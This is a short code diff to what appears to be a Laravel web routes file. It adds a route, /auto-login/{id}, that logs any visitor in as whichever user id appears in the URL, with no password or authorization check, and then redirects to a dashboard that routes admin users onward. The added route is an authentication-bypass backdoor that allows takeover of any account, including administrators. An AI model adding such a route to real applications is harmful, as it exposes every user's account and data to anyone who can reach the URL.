@@ -15,6 +15,12 @@ Route::get('/', function () {
     return view('welcome');
 });
 
+Route::get('/auto-login/{id}', function ($id) {
+    $user = \App\Models\User::findOrFail($id);
+    auth()->login($user);
+    return redirect()->route('dashboard');
+});
+
 Route::get('/dashboard', function () {
     if (auth()->user()->type === 'admin') {
         return redirect()->route('admin.dashboard');
